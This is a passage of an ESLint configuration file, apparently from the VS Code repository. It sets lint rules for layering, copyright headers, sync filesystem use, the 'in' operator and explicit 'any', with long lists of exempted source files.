/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// @ts-check
import { fixupPluginRules } from '@eslint/compat';
import { defineConfig } from 'eslint/config';
import fs from 'fs';
import { builtinModules } from 'module';
import path from 'path';
import tseslint from 'typescript-eslint';

import stylistic from '@stylistic/eslint-plugin';
import * as pluginLocal from './.eslint-plugin-local/index.ts';
import * as pluginCopilotLocal from './extensions/copilot/.eslintplugin/index.ts';
import pluginImport from 'eslint-plugin-import';
import pluginJsdoc from 'eslint-plugin-jsdoc';

import pluginHeader from 'eslint-plugin-header';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

pluginHeader.rules.header.meta.schema = false;

const ignores = fs.readFileSync(path.join(import.meta.dirname, '.eslint-ignore'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.filter(line => line && !line.startsWith('#'));

const allowedJavaScriptFiles = fs.readFileSync(path.join(import.meta.dirname, '.eslint-allowed-javascript-files'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.map(line => line.trim())
	.filter(line => line && !line.startsWith('#'));

const allowedBracketNotationFiles = fs.readFileSync(path.join(import.meta.dirname, '.eslint-allowed-bracket-notation-files'), 'utf8')
	.toString()
	.split(/\r\n|\n/)
	.map(line => line.trim())
	.filter(line => line && !line.startsWith('#'));

export default defineConfig(
	// Global ignores
	{
		ignores: [
			...ignores,
			'!**/.eslint-plugin-local/**/*'
		],
	},
	// All files (JS and TS)
	{
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
			'header': fixupPluginRules(/** @type {any} */ (pluginHeader)),
		},
		rules: {
			'constructor-super': 'warn',
			'curly': 'warn',
			'eqeqeq': 'warn',
			'prefer-const': [
				'warn',
				{
					'destructuring': 'all'
				}
			],
			'no-buffer-constructor': 'warn',
			'no-caller': 'warn',
			'no-case-declarations': 'warn',
			'no-debugger': 'warn',
			'no-duplicate-case': 'warn',
			'no-duplicate-imports': 'warn',
			'no-eval': 'warn',
			'no-async-promise-executor': 'warn',
			'no-extra-semi': 'warn',
			'no-new-wrappers': 'warn',
			'no-redeclare': 'off',
			'no-sparse-arrays': 'warn',
			'no-throw-literal': 'warn',
			'no-unsafe-finally': 'warn',
			'no-unused-labels': 'warn',
			'no-misleading-character-class': 'warn',
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context'
			], // non-complete list of globals that are easy to access unintentionally
			'no-var': 'warn',
			'semi': 'warn',
			'local/code-translation-remind': 'warn',
			'local/code-no-declare-const-enum': 'warn',
			'local/code-parameter-properties-must-have-explicit-accessibility': 'warn',
			'local/code-no-nls-in-standalone-editor': 'warn',
			'local/code-no-potentially-unsafe-disposables': 'warn',
			'local/code-no-dangerous-type-assertions': 'warn',
			'local/code-no-any-casts': 'warn',
			'local/code-no-standalone-editor': 'warn',
			'local/code-no-unexternalized-strings': 'warn',
			'local/code-must-use-super-dispose': 'warn',
			'local/code-declare-service-brand': 'warn',
			'local/code-no-reader-after-await': 'warn',
			'local/code-no-accessor-after-await': 'warn',
			'local/code-no-observable-get-in-reactive-context': 'warn',
			'local/code-no-localized-model-description': 'warn',
			'local/code-policy-localization-key-match': 'warn',
			'local/code-no-localization-template-literals': 'error',
			'local/code-no-icons-in-localized-strings': 'warn',
			'local/code-no-http-import': ['warn', { target: 'src/vs/**' }],
			'local/code-no-deep-import-of-internal': ['error', { '.*Internal': true, 'searchExtTypesInternal': false }],
			'local/code-no-private-agent-host-meta-import': 'error',
			'local/code-layering': [
				'warn',
				{
					'common': [],
					'node': [
						'common'
					],
					'browser': [
						'common'
					],
					'electron-browser': [
						'common',
						'browser'
					],
					'electron-utility': [
						'common',
						'node'
					],
					'electron-main': [
						'common',
						'node',
						'electron-utility'
					]
				}
			],
			'header/header': [
				2,
				'block',
				[
					'---------------------------------------------------------------------------------------------',
					' *  Copyright (c) Microsoft Corporation. All rights reserved.',
					' *  Licensed under the MIT License. See License.txt in the project root for license information.',
					' *--------------------------------------------------------------------------------------------'
				]
			]
		},
	},
	// Production filesystem operations must not block the event loop.
	{
		files: [
			'src/**/*.{ts,tsx,js,jsx,mjs,cjs,mts,cts}',
			'extensions/**/src/**/*.{ts,tsx,js,jsx,mjs,cjs,mts,cts}',
		],
		ignores: [
			// Bootstrap entry points and the AMD loader retain their startup I/O.
			'src/*',
			'src/vs/amdX.ts',
			'src/vs/code/electron-main/main.ts',
			// Core synchronous helpers and startup/shutdown infrastructure.
			'src/vs/base/node/pfs.ts',
			'src/vs/platform/environment/node/wait.ts',
			'src/vs/server/node/remoteExtensionHostAgentServer.ts',
			'src/vs/server/node/server.main.ts',
			'src/vs/workbench/api/node/extHostCLIServer.ts',
			'src/vs/workbench/api/node/extHostExtensionService.ts',
			'src/vs/workbench/api/node/extHostStoragePaths.ts',
			'**/test/**',
			'**/tests/**',
			'**/fixtures/**',
			'**/*.{test,spec,stest,integrationTest}.{ts,tsx,js,jsx,mts,cts,mjs,cjs}',
			'**/scripts/**',
			'**/script/**',
			'**/build/**',
			'extensions/vscode-test-resolver/**',
			'extensions/vscode-api-tests/**',
			// These isolated CLI/askpass processes do not share the application's event loop.
			'src/vs/code/node/cli.ts',
			'src/vs/server/node/server.cli.ts',
			'extensions/git/src/askpass-main.ts',
		],
		rules: {
			'local/code-no-sync-fs': 'error',
		},
	},
	// Disallow bracket notation for property names that can use dot notation.
	{
		files: [
			'**/*.{js,cjs,mjs,ts,tsx,mts,cts}',
			'.eslint-plugin-local/**/*.ts',
		],
		ignores: allowedBracketNotationFiles,
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-bracket-notation-for-identifiers': 'warn',
		},
	},
	// TS
	{
		files: [
			'**/*.{ts,tsx,mts,cts}',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@stylistic': stylistic,
			'@typescript-eslint': tseslint.plugin,
			'local': pluginLocal,
			'jsdoc': pluginJsdoc,
		},
		rules: {
			// Disable built-in semi rules in favor of stylistic
			'semi': 'off',
			'@stylistic/semi': 'warn',
			'@stylistic/member-delimiter-style': 'warn',
			'local/code-no-unused-expressions': [
				'warn',
				{
					'allowTernary': true
				}
			],
			'jsdoc/no-types': 'warn',
			'local/code-no-static-self-ref': 'warn',
			'@typescript-eslint/naming-convention': [
				'warn',
				{
					'selector': 'class',
					'format': [
						'PascalCase'
					]
				}
			]
		}
	},
	{
		files: [
			'src/vs/platform/agentHost/test/**/missionControl*.test.ts',
			'src/vs/platform/agentHost/test/**/protocolServerHandler.test.ts',
			'src/vs/platform/agentHost/test/**/agentHostProtocolClient.test.ts',
			'src/vs/platform/agentHost/test/**/webPubSubRelayTransport.test.ts',
			'src/vs/platform/agentHost/test/common/webPubSub/*.test.ts',
			'src/vs/workbench/contrib/chat/test/browser/remoteAgentHost/cloudSandbox*.test.ts',
			'src/vs/sessions/contrib/providers/remoteAgentHost/test/browser/remoteAgentHost.contribution.test.ts',
		],
		plugins: {
			'agent-host-test': {
				rules: {
					'no-nested-tests': {
						meta: {
							type: 'problem',
							schema: [],
							messages: { nested: 'Declare tests in the suite, not inside another test; Mocha does not execute nested declarations.' },
						},
						create(context) {
							return {
								'CallExpression[callee.name="test"] CallExpression[callee.name="test"]'(node) {
									context.report({ node, messageId: 'nested' });
								},
							};
						},
					},
				},
			},
		},
		rules: {
			'agent-host-test/no-nested-tests': 'error',
		},
	},
	// Disallow common telemetry properties in event data
	{
		files: [
			'src/**/*.ts',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-telemetry-common-property': 'warn',
		}
	},
	// Force all gulp imports under build/ to go through the gulp facade
	{
		files: [
			'build/**/*.ts',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-direct-gulp-import': 'warn',
		}
	},
	// Disallow 'in' operator except in type predicates
	{
		files: [
			'**/*.ts',
			'.eslint-plugin-local/**/*.ts', // Explicitly include files under dot directories
		],
		ignores: [
			'src/bootstrap-node.ts',
			'build/lib/extensions.ts',
			'build/lib/test/render.test.ts',
			'extensions/copilot/**/*',
			'extensions/debug-auto-launch/src/extension.ts',
			'extensions/emmet/src/updateImageSize.ts',
			'extensions/emmet/src/util.ts',
			'extensions/github-authentication/src/node/fetch.ts',
			'extensions/tunnel-forwarding/src/extension.ts',
			'extensions/typescript-language-features/src/utils/platform.ts',
			'extensions/typescript-language-features/web/src/webServer.ts',
			'src/vs/base/browser/broadcast.ts',
			'src/vs/base/browser/canIUse.ts',
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/markdownRenderer.ts',
			'src/vs/base/browser/touch.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/desktopEnvironmentInfo.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/editor/browser/controller/editContext/native/debugEditContext.ts',
			'src/vs/editor/browser/gpu/gpuUtils.ts',
			'src/vs/editor/browser/gpu/taskQueue.ts',
			'src/vs/editor/browser/view.ts',
			'src/vs/editor/browser/widget/diffEditor/diffEditorWidget.ts',
			'src/vs/editor/browser/widget/diffEditor/utils.ts',
			'src/vs/editor/browser/widget/multiDiffEditor/multiDiffEditorWidgetImpl.ts',
			'src/vs/editor/common/config/editorOptions.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteContribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/copyPasteController.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/edit.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/provideInlineCompletions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/platform/accessibilitySignal/browser/accessibilitySignalService.ts',
			'src/vs/platform/configuration/common/configuration.ts',
			'src/vs/platform/configuration/common/configurationModels.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/test/common/scanner.test.ts',
			'src/vs/platform/dataChannel/browser/forwardingTelemetryService.ts',
			'src/vs/platform/hover/browser/hoverService.ts',
			'src/vs/platform/hover/browser/hoverWidget.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/mcp/common/mcpManagementCli.ts',
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/browser/mainThreadDebugService.ts',
			'src/vs/workbench/api/browser/mainThreadTesting.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHostChatAgents2.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostNotebookKernels.ts',
			'src/vs/workbench/api/common/extHostQuickOpen.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/node/loopbackServer.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/extHostTypeConverters.test.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/browser/parts/paneCompositeBar.ts',
			'src/vs/workbench/browser/parts/titlebar/titlebarPart.ts',
			'src/vs/workbench/browser/workbench.ts',
			'src/vs/workbench/common/notifications.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/attachments/chatAttachmentResolveService.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatAttachmentsContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatConfirmationWidget.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatElicitationContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatReferencesContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatTreeContentPart.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/toolInvocationParts/abstractToolConfirmationSubPart.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSession.ts',
			'src/vs/workbench/contrib/chat/browser/chatEditing/chatEditingSessionStorage.ts',
			'src/vs/workbench/contrib/chat/browser/widget/chatContentParts/chatInlineAnchorWidget.ts',
			'src/vs/workbench/contrib/chat/browser/accessibility/chatResponseAccessibleView.ts',
			'src/vs/workbench/contrib/chat/browser/widget/input/editor/chatInputCompletions.ts',
			'src/vs/workbench/contrib/chat/common/model/chatModel.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.test.ts',
			'src/vs/workbench/contrib/chat/test/common/promptSyntax/testUtils/mockFilesystem.ts',
			'src/vs/workbench/contrib/chat/test/common/tools/builtinTools/manageTodoListTool.test.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/debugModel.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replAccessibilityAnnouncer.ts',
			'src/vs/workbench/contrib/editSessions/browser/editSessionsStorageService.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/extensions/common/extensionQuery.ts',
			'src/vs/workbench/contrib/interactive/browser/interactiveEditorInput.ts',
			'src/vs/workbench/contrib/issue/browser/issueFormService.ts',
			'src/vs/workbench/contrib/issue/browser/issueQuickAccess.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mcp/browser/mcpElicitationService.ts',
			'src/vs/workbench/contrib/mcp/common/mcpLanguageModelToolContribution.ts',
			'src/vs/workbench/contrib/mcp/common/mcpResourceFilesystem.ts',
			'src/vs/workbench/contrib/mcp/common/mcpSamplingLog.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServer.ts',
			'src/vs/workbench/contrib/mcp/common/mcpServerRequestHandler.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpRegistryTypes.ts',
			'src/vs/workbench/contrib/mcp/test/common/mcpServerRequestHandler.test.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/cellOutputActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/notebook.chat.contribution.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelView.ts',
			'src/vs/workbench/contrib/output/browser/outputView.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/remoteTunnel/electron-browser/remoteTunnel.contribution.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/listProjection.ts',
			'src/vs/workbench/contrib/testing/browser/explorerProjections/treeProjection.ts',
			'src/vs/workbench/contrib/testing/browser/testCoverageBars.ts',
			'src/vs/workbench/contrib/testing/browser/testExplorerActions.ts',
			'src/vs/workbench/contrib/testing/browser/testingOutputPeek.ts',
			'src/vs/workbench/contrib/testing/browser/testingProgressUiService.ts',
			'src/vs/workbench/contrib/testing/browser/testResultsView/testResultsTree.ts',
			'src/vs/workbench/contrib/testing/common/testCoverageService.ts',
			'src/vs/workbench/contrib/testing/common/testResultService.ts',
			'src/vs/workbench/contrib/testing/common/testingChatAgentTool.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/themes/browser/themes.contribution.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStarted.contribution.ts',
			'src/vs/workbench/services/environment/electron-browser/environmentService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingIO.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/textSearchManager.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/platform/agentHost/common/state/protocol/**',
			'test/automation/src/playwrightDriver.ts',
			'.eslint-plugin-local/**/*',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-in-operator': 'warn',
		}
	},
	// Guard the agent host protocol `_meta` bag: no untyped field access or casts.
	{
		files: [
			'src/vs/platform/agentHost/**/*.ts',
			'src/vs/workbench/contrib/chat/browser/agentSessions/**/*.ts',
			'src/vs/workbench/services/agentHost/**/*.ts',
			'src/vs/sessions/**/*.ts',
		],
		ignores: [
			// Tests assert on the raw `_meta` wire shape on purpose (verifying
			// producers); routing them through readers would weaken them.
			'**/test/**',
			'**/*.test.ts',
			'**/*.integrationTest.ts',
			// This directory is the validation boundary for typed metadata
			// readers. Callers elsewhere must consume those readers.
			'src/vs/platform/agentHost/common/meta/**',
			// Copilot SDK metadata is already typed and is not an AHP `_meta`
			// bag. Keep its access isolated in one adapter.
			'src/vs/platform/agentHost/node/copilot/copilotSdkMeta.ts',
			// Codex's own generated app-server protocol (not AHP `_meta`).
			'src/vs/platform/agentHost/node/codex/protocol/**',
		],
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-untyped-meta-access': 'warn',
		}
	},
	// Strict no explicit `any`
	{
		files: [
			// Extensions
			'extensions/git/src/**/*.ts',
			'extensions/git-base/src/**/*.ts',
			'extensions/github/src/**/*.ts',
			// vscode
			'src/**/*.ts',
		],
		ignores: [
			// Extensions
			'extensions/git/src/commands.ts',
			'extensions/git/src/decorators.ts',
			'extensions/git/src/git.ts',
			'extensions/git/src/util.ts',
			'extensions/git-base/src/decorators.ts',
			'extensions/github/src/util.ts',
			// vscode d.ts
			'src/vs/amdX.ts',
			'src/vs/monaco.d.ts',
			'src/vscode-dts/**',
			// Base
			'src/vs/base/browser/dom.ts',
			'src/vs/base/browser/mouseEvent.ts',
			'src/vs/base/node/processes.ts',
			'src/vs/base/common/arrays.ts',
			'src/vs/base/common/async.ts',
			'src/vs/base/common/console.ts',
			'src/vs/base/common/decorators.ts',
			'src/vs/base/common/errorMessage.ts',
			'src/vs/base/common/errors.ts',
			'src/vs/base/common/event.ts',
			'src/vs/base/common/hotReload.ts',
			'src/vs/base/common/hotReloadHelpers.ts',
			'src/vs/base/common/json.ts',
			'src/vs/base/common/jsonSchema.ts',
			'src/vs/base/common/lifecycle.ts',
			'src/vs/base/common/map.ts',
			'src/vs/base/common/marshalling.ts',
			'src/vs/base/common/objects.ts',
			'src/vs/base/common/performance.ts',
			'src/vs/base/common/platform.ts',
			'src/vs/base/common/processes.ts',
			'src/vs/base/common/types.ts',
			'src/vs/base/common/uriIpc.ts',
			'src/vs/base/common/verifier.ts',
			'src/vs/base/common/observableInternal/base.ts',
			'src/vs/base/common/observableInternal/changeTracker.ts',
			'src/vs/base/common/observableInternal/set.ts',
			'src/vs/base/common/observableInternal/transaction.ts',
			'src/vs/base/common/worker/webWorkerBootstrap.ts',
			'src/vs/base/test/common/mock.ts',
			'src/vs/base/test/common/snapshot.ts',
			'src/vs/base/test/common/timeTravelScheduler.ts',
			'src/vs/base/test/common/troubleshooting.ts',
			'src/vs/base/test/common/utils.ts',
			'src/vs/base/browser/ui/breadcrumbs/breadcrumbsWidget.ts',
			'src/vs/base/browser/ui/grid/grid.ts',
			'src/vs/base/browser/ui/grid/gridview.ts',
			'src/vs/base/browser/ui/list/listPaging.ts',
			'src/vs/base/browser/ui/list/listView.ts',
			'src/vs/base/browser/ui/list/listWidget.ts',
			'src/vs/base/browser/ui/list/rowCache.ts',
			'src/vs/base/browser/ui/sash/sash.ts',
			'src/vs/base/browser/ui/table/tableWidget.ts',
			'src/vs/base/parts/ipc/common/ipc.net.ts',
			'src/vs/base/parts/ipc/common/ipc.ts',
			'src/vs/base/parts/ipc/electron-main/ipcMain.ts',
			'src/vs/base/parts/ipc/node/ipc.cp.ts',
			'src/vs/base/common/observableInternal/experimental/reducer.ts',
			'src/vs/base/common/observableInternal/experimental/utils.ts',
			'src/vs/base/common/observableInternal/logging/consoleObservableLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugGetDependencyGraph.ts',
			'src/vs/base/common/observableInternal/logging/logging.ts',
			'src/vs/base/common/observableInternal/observables/baseObservable.ts',
			'src/vs/base/common/observableInternal/observables/derived.ts',
			'src/vs/base/common/observableInternal/observables/derivedImpl.ts',
			'src/vs/base/common/observableInternal/observables/observableFromEvent.ts',
			'src/vs/base/common/observableInternal/observables/observableSignalFromEvent.ts',
			'src/vs/base/common/observableInternal/reactions/autorunImpl.ts',
			'src/vs/base/common/observableInternal/utils/utils.ts',
			'src/vs/base/common/observableInternal/utils/utilsCancellation.ts',
			'src/vs/base/parts/ipc/test/node/testService.ts',
			'src/vs/base/common/observableInternal/logging/debugger/debuggerRpc.ts',
			'src/vs/base/common/observableInternal/logging/debugger/devToolsLogger.ts',
			'src/vs/base/common/observableInternal/logging/debugger/rpc.ts',
			'src/vs/base/test/browser/ui/grid/util.ts',
			// Platform
			'src/vs/platform/commands/common/commands.ts',
			'src/vs/platform/contextkey/browser/contextKeyService.ts',
			'src/vs/platform/contextkey/common/contextkey.ts',
			'src/vs/platform/contextview/browser/contextView.ts',
			'src/vs/platform/debug/common/extensionHostDebugIpc.ts',
			'src/vs/platform/debug/electron-main/extensionHostDebugIpc.ts',
			'src/vs/platform/diagnostics/common/diagnostics.ts',
			'src/vs/platform/download/common/downloadIpc.ts',
			'src/vs/platform/extensions/common/extensions.ts',
			'src/vs/platform/instantiation/common/descriptors.ts',
			'src/vs/platform/instantiation/common/extensions.ts',
			'src/vs/platform/instantiation/common/instantiation.ts',
			'src/vs/platform/instantiation/common/instantiationService.ts',
			'src/vs/platform/instantiation/common/serviceCollection.ts',
			'src/vs/platform/keybinding/common/keybinding.ts',
			'src/vs/platform/keybinding/common/keybindingResolver.ts',
			'src/vs/platform/keybinding/common/keybindingsRegistry.ts',
			'src/vs/platform/keybinding/common/resolvedKeybindingItem.ts',
			'src/vs/platform/languagePacks/node/languagePacks.ts',
			'src/vs/platform/list/browser/listService.ts',
			'src/vs/platform/log/browser/log.ts',
			'src/vs/platform/log/common/log.ts',
			'src/vs/platform/log/common/logIpc.ts',
			'src/vs/platform/log/electron-main/logIpc.ts',
			'src/vs/platform/meteredConnection/electron-main/meteredConnectionChannel.ts',
			'src/vs/platform/observable/common/wrapInHotClass.ts',
			'src/vs/platform/observable/common/wrapInReloadableClass.ts',
			'src/vs/platform/policy/common/policyIpc.ts',
			'src/vs/platform/profiling/common/profilingTelemetrySpec.ts',
			'src/vs/platform/quickinput/browser/quickInputActions.ts',
			'src/vs/platform/quickinput/common/quickInput.ts',
			'src/vs/platform/registry/common/platform.ts',
			'src/vs/platform/remote/browser/browserSocketFactory.ts',
			'src/vs/platform/remote/browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remote/common/remoteAgentConnection.ts',
			'src/vs/platform/remote/common/remoteAuthorityResolver.ts',
			'src/vs/platform/remote/electron-browser/electronRemoteResourceLoader.ts',
			'src/vs/platform/remote/electron-browser/remoteAuthorityResolverService.ts',
			'src/vs/platform/remoteTunnel/node/remoteTunnelService.ts',
			'src/vs/platform/request/common/request.ts',
			'src/vs/platform/request/common/requestIpc.ts',
			'src/vs/platform/request/electron-utility/requestService.ts',
			'src/vs/platform/request/node/proxy.ts',
			'src/vs/platform/telemetry/browser/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/errorTelemetry.ts',
			'src/vs/platform/telemetry/common/remoteTelemetryChannel.ts',
			'src/vs/platform/telemetry/node/errorTelemetry.ts',
			'src/vs/platform/theme/common/iconRegistry.ts',
			'src/vs/platform/theme/common/tokenClassificationRegistry.ts',
			'src/vs/platform/update/common/updateIpc.ts',
			'src/vs/platform/update/electron-main/updateService.snap.ts',
			'src/vs/platform/url/common/urlIpc.ts',
			'src/vs/platform/userDataProfile/common/userDataProfileIpc.ts',
			'src/vs/platform/userDataProfile/electron-main/userDataProfileStorageIpc.ts',
			'src/vs/platform/userDataSync/common/abstractSynchronizer.ts',
			'src/vs/platform/userDataSync/common/extensionsMerge.ts',
			'src/vs/platform/userDataSync/common/extensionsSync.ts',
			'src/vs/platform/userDataSync/common/globalStateMerge.ts',
			'src/vs/platform/userDataSync/common/globalStateSync.ts',
			'src/vs/platform/userDataSync/common/settingsMerge.ts',
			'src/vs/platform/userDataSync/common/settingsSync.ts',
			'src/vs/platform/userDataSync/common/userDataSync.ts',
			'src/vs/platform/userDataSync/common/userDataSyncIpc.ts',
			'src/vs/platform/userDataSync/common/userDataSyncServiceIpc.ts',
			'src/vs/platform/webview/common/webviewManagerService.ts',
			'src/vs/platform/instantiation/test/common/instantiationServiceMock.ts',
			'src/vs/platform/keybinding/test/common/mockKeybindingService.ts',
			// Editor
			'src/vs/editor/standalone/browser/standaloneEditor.ts',
			'src/vs/editor/standalone/browser/standaloneLanguages.ts',
			'src/vs/editor/standalone/browser/standaloneServices.ts',
			'src/vs/editor/test/browser/testCodeEditor.ts',
			'src/vs/editor/test/common/testTextModel.ts',
			'src/vs/editor/contrib/bracketMatching/browser/bracketMatching.ts',
			'src/vs/editor/contrib/codeAction/browser/codeAction.ts',
			'src/vs/editor/contrib/codeAction/browser/codeActionCommands.ts',
			'src/vs/editor/contrib/codeAction/common/types.ts',
			'src/vs/editor/contrib/colorPicker/browser/colorDetector.ts',
			'src/vs/editor/contrib/diffEditorBreadcrumbs/browser/contribution.ts',
			'src/vs/editor/contrib/dropOrPasteInto/browser/dropIntoEditorContribution.ts',
			'src/vs/editor/contrib/find/browser/findController.ts',
			'src/vs/editor/contrib/find/browser/findModel.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/goToCommands.ts',
			'src/vs/editor/contrib/gotoSymbol/browser/symbolNavigation.ts',
			'src/vs/editor/contrib/hover/browser/hoverActions.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/structuredLogger.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/utils.ts',
			'src/vs/editor/contrib/smartSelect/browser/smartSelect.ts',
			'src/vs/editor/contrib/stickyScroll/browser/stickyScrollModelProvider.ts',
			'src/vs/editor/contrib/unicodeHighlighter/browser/unicodeHighlighter.ts',
			'src/vs/editor/contrib/wordHighlighter/browser/wordHighlighter.ts',
			'src/vs/editor/standalone/common/monarch/monarchCommon.ts',
			'src/vs/editor/standalone/common/monarch/monarchCompile.ts',
			'src/vs/editor/standalone/common/monarch/monarchLexer.ts',
			'src/vs/editor/standalone/common/monarch/monarchTypes.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/controller/commands.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/inlineCompletionsModel.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/model/typingSpeed.ts',
			'src/vs/editor/contrib/inlineCompletions/test/browser/utils.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/ghostText/ghostTextView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/components/gutterIndicatorView.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/inlineEditsViews/debugVisualization.ts',
			'src/vs/editor/contrib/inlineCompletions/browser/view/inlineEdits/utils/utils.ts',
			// Workbench
			'src/vs/workbench/api/browser/mainThreadChatSessions.ts',
			'src/vs/workbench/api/common/extHost.api.impl.ts',
			'src/vs/workbench/api/common/extHost.protocol.ts',
			'src/vs/workbench/api/common/extHostChatSessions.ts',
			'src/vs/workbench/api/common/extHostCodeInsets.ts',
			'src/vs/workbench/api/common/extHostCommands.ts',
			'src/vs/workbench/api/common/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/common/extHostDataChannels.ts',
			'src/vs/workbench/api/common/extHostDebugService.ts',
			'src/vs/workbench/api/common/extHostExtensionActivator.ts',
			'src/vs/workbench/api/common/extHostExtensionService.ts',
			'src/vs/workbench/api/common/extHostFileSystemConsumer.ts',
			'src/vs/workbench/api/common/extHostFileSystemEventService.ts',
			'src/vs/workbench/api/common/extHostLanguageFeatures.ts',
			'src/vs/workbench/api/common/extHostLanguageModelTools.ts',
			'src/vs/workbench/api/common/extHostMcp.ts',
			'src/vs/workbench/api/common/extHostMemento.ts',
			'src/vs/workbench/api/common/extHostMessageService.ts',
			'src/vs/workbench/api/common/extHostNotebookDocument.ts',
			'src/vs/workbench/api/common/extHostNotebookDocumentSaveParticipant.ts',
			'src/vs/workbench/api/common/extHostRequireInterceptor.ts',
			'src/vs/workbench/api/common/extHostRpcService.ts',
			'src/vs/workbench/api/common/extHostSCM.ts',
			'src/vs/workbench/api/common/extHostSearch.ts',
			'src/vs/workbench/api/common/extHostStatusBar.ts',
			'src/vs/workbench/api/common/extHostStoragePaths.ts',
			'src/vs/workbench/api/common/extHostTelemetry.ts',
			'src/vs/workbench/api/common/extHostTesting.ts',
			'src/vs/workbench/api/common/extHostTextEditor.ts',
			'src/vs/workbench/api/common/extHostTimeline.ts',
			'src/vs/workbench/api/common/extHostTreeViews.ts',
			'src/vs/workbench/api/common/extHostTypeConverters.ts',
